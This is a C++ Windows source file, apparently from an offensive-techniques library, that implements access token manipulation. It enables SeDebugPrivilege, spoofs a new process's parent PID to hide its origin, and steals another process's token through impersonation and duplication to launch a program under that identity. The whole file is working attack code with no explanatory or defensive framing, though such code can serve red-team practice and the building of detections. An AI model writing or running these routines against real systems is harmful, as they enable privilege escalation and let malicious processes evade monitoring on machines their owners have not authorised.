#include "access_token_manipulation.h"

namespace win {

	DWORD SetPrivilege(HANDLE token_handle, const std::wstring& privilege_name, bool enable_privileg)
	{
		TOKEN_PRIVILEGES token_privilege = {};
		LUID luid = {};

		if (!::LookupPrivilegeValueW(nullptr, privilege_name.data(), &luid)) {
			return ::GetLastError();
		}

		token_privilege.PrivilegeCount = 1;
		token_privilege.Privileges[0].Luid = luid;
		if (enable_privileg) {
			token_privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		}
		else {
			token_privilege.Privileges[0].Attributes = 0;
		}

		if (!::AdjustTokenPrivileges(token_handle, false, &token_privilege, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
			return ::GetLastError();
		}

		return ERROR_SUCCESS;
	}

	DWORD AccessTokenManipulation::ParentPidSpoofing(DWORD parent_proc_infod, const std::wstring& process_path){
		SIZE_T size = 0;
		PVOID buffer = nullptr;
		STARTUPINFOEX start_info = { sizeof(start_info) };
		PROCESS_INFORMATION proc_info = { };
		HANDLE process_handle = nullptr;

		process_handle = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_proc_infod);
		if (process_handle == nullptr){
			return ::GetLastError();
		}

		::InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
		if (size != 0){
			buffer = ::malloc(size);

			PPROC_THREAD_ATTRIBUTE_LIST attributes = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(buffer);

			::InitializeProcThreadAttributeList(attributes, 1, 0, &size);
			if (attributes != nullptr){
				::UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &process_handle, sizeof(process_handle), nullptr, nullptr);
				start_info.lpAttributeList = attributes;

				if (!::CreateProcessW(nullptr, const_cast<LPWSTR>(process_path.data()), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, reinterpret_cast<STARTUPINFO*>(&start_info), &proc_info)){
					return ::GetLastError();
				}

				::DeleteProcThreadAttributeList(attributes);
				::CloseHandle(proc_info.hProcess);
				::CloseHandle(proc_info.hThread);
			}

			::free(buffer);
		}

		::CloseHandle(process_handle);

		return ERROR_SUCCESS;
	}

	DWORD AccessTokenManipulation::TokenImpersonationTheft(DWORD target_pid, const std::wstring& create_process_name){
		STARTUPINFOEX start_info = { sizeof(start_info) };
		PROCESS_INFORMATION proc_info = { };
		HANDLE current_token_handle = nullptr;
		HANDLE token_handle = nullptr;
		HANDLE duplicate_token_handle = nullptr;
		HANDLE process_handle = nullptr;

		if (!::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &current_token_handle)) {
			return ::GetLastError();
		}

		if (SetPrivilege(current_token_handle, L"SeDebugPrivilege", true) != ERROR_SUCCESS) {
			return ::GetLastError();
		}

		process_handle = ::OpenProcess(PROCESS_QUERY_INFORMATION, true, target_pid);
		if (!process_handle) {
			return ::GetLastError();
		}
		else {
			if (!::OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &token_handle)) {
				return ::GetLastError();
			}

			if (!::ImpersonateLoggedOnUser(token_handle)) {
				return ::GetLastError();
			}

			if (!::DuplicateTokenEx(token_handle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, nullptr, SecurityImpersonation, TokenPrimary, &duplicate_token_handle)) {
				return ::GetLastError();
			}
			else {
				if (!::CreateProcessWithTokenW(duplicate_token_handle, LOGON_WITH_PROFILE, create_process_name.data(), nullptr, 0, nullptr, nullptr, reinterpret_cast<STARTUPINFO*>(&start_info), &proc_info)) {
					return ::GetLastError();
				}
			}
		}

		return ERROR_SUCCESS;
	}



} //namespace win